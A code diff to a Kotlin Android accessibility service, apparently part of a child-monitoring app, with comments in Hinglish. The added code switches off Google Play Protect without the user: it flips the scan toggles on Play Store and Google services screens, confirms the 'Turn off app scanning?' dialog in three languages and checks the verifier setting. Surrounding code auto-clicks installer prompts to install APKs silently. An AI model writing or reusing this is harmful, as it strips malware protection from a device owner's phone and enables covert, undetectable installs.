@@ -332,6 +332,14 @@ class EnforcementService : AccessibilityService() {
             "com.miui.packageinstaller", "com.samsung.android.packageinstaller"
         )
 
+        /** Play Protect settings/confirmation windows (vc17 "protect" step) — scan
+         *  toggle OFF flip sirf in packages ki windows par, aur sirf jab screen par
+         *  "protect" text visible ho (random toggle flip se bachne ke liye).
+         *  ALLOW_PKGS me com.android.vending JAAN-BOOJH kar NAHI hai (Play Store ki
+         *  windows par install/update labels kabhi auto-click na hon) — protect ka
+         *  package-gate alag, sirf is step ke liye hai. */
+        val PROTECT_PKGS = setOf("com.android.vending", "com.google.android.gms")
+
         /** Packages that may host the MediaProjection consent dialog. */
         private val PROJECTION_DIALOG_PKGS = ALLOW_PKGS + setOf(
             "com.miui.securitycenter", "com.miui.home",
@@ -387,6 +395,15 @@ class EnforcementService : AccessibilityService() {
                 "इंस्टॉल करें", "इंस्टॉल करें।", "जारी रखें",
                 "अपडेट करें", "अपडेट", "फिर भी इंस्टॉल करें", "फिर भी अपडेट करें",
                 "安装", "仍然安装", "继续安装", "更新", "仍然更新"
+            ),
+            // VC17 Play Protect OFF: toggle flip ke baad Play Store confirmation
+            // dialog ("Turn off app scanning?") ka positive button. Toggle khud
+            // Switch node hai — clickProtectPass usko flip karta hai, ye labels
+            // sirf confirm dialog ke buttons ke liye. English + Hindi + Chinese.
+            "protect" to setOf(
+                "turn off", "ok", "turn off scanning",
+                "बंद करें", "बंद करें?", "टर्न ऑफ",
+                "关闭", "确定"
             )
         )
     }
@@ -625,6 +642,9 @@ class EnforcementService : AccessibilityService() {
             // bhi khud click — zero-touch finish (warna "App installed" screen
             // bachche ke phone par khadi reh jaati hai).
             "install" -> clickExact(step) || clickInstallDone()
+            // VC17 Play Protect OFF: scan + improve-detection toggles flip (OFF).
+            // Package-gated (vending/gms) + screen-text gate — clickProtectPass.
+            "protect" -> clickProtectPass() || clickExact(step)
             else -> clickExact(step)
         }
     }
@@ -659,6 +679,14 @@ class EnforcementService : AccessibilityService() {
             "notif" -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
             // Install-unknown-apps: silent APK update ke liye zaroori
             "unknown" -> runCatching { ctx.packageManager.canRequestPackageInstalls() }.getOrDefault(false)
+            // VC17 Play Protect: Settings.Secure "package_verifier_user_consent"
+            // 0 = scan OFF (Play Protect toggle isi ko likhta hai). 1 = abhi ON.
+            // Missing (-1) = padh nahi paye — done NAHI maano (toggle flip hoga).
+            "protect" -> runCatching {
+                android.provider.Settings.Secure.getInt(
+                    ctx.contentResolver, "package_verifier_user_consent", -1
+                ) == 0
+            }.getOrDefault(false)
             // install/uninstall steps kabhi "done" nahi hote — click hi success hai
             else -> false
         }
@@ -713,6 +741,51 @@ class EnforcementService : AccessibilityService() {
             }
         }
         return false
+    }
+
+    /** VC17 Play Protect OFF — ek pass: saari windows me se vending/gms windows
+     *  lo, screen par "protect" text confirm karo (Play Protect screen hi hai),
+     *  phir CHECKED switches flip karo (scan + improve-detection dono OFF hone
+     *  tak). Confirmation dialog ka "Turn off" clickExact("protect") handle karta
+     *  hai. Safety: bina "protect" text ke koi switch kabhi flip nahi hota —
+     *  random Play Store screen par toggle galti se nahi chhedenge. */
+    private fun clickProtectPass(): Boolean {
+        return runCatching {
+            val roots = mutableListOf<AccessibilityNodeInfo>()
+            rootInActiveWindow?.let { roots.add(it) }
+            windows?.forEach { w -> runCatching { w.root?.let { r -> roots.add(r) } } }
+            var acted = false
+            for (root in roots) {
+                val pkg = root.packageName?.toString() ?: continue
+                if (pkg !in PROTECT_PKGS) continue
+                // Screen-text gate: Play Protect screen par "protect" word hota hai
+                val looksRight = runCatching {
+                    root.findAccessibilityNodeInfosByText("protect").isNotEmpty()
+                }.getOrDefault(false)
+                if (!looksRight) continue
+                for (sw in collectCheckables(root, 300)) {
+                    if (sw.isCheckable && sw.isChecked && clickDeep(sw)) acted = true
+                }
+            }
+            acted
+        }.getOrDefault(false)
+    }
+
+    /** Tree-walk: saare checkable nodes (switch/toggle/checkbox) — budget-capped. */
+    private fun collectCheckables(node: AccessibilityNodeInfo, budget: Int): List<AccessibilityNodeInfo> {
+        val out = mutableListOf<AccessibilityNodeInfo>()
+        val stack = ArrayDeque<AccessibilityNodeInfo>()
+        stack.add(node)
+        var visited = 0
+        while (stack.isNotEmpty() && visited < budget) {
+            val n = stack.removeFirst()
+            visited++
+            if (n.isCheckable) out.add(n)
+            for (i in 0 until n.childCount) {
+                runCatching { n.getChild(i) }.getOrNull()?.let { stack.add(it) }
+            }
+        }
+        return out
     }
 
     /** Update/install complete hone par installer ka "App installed / Update
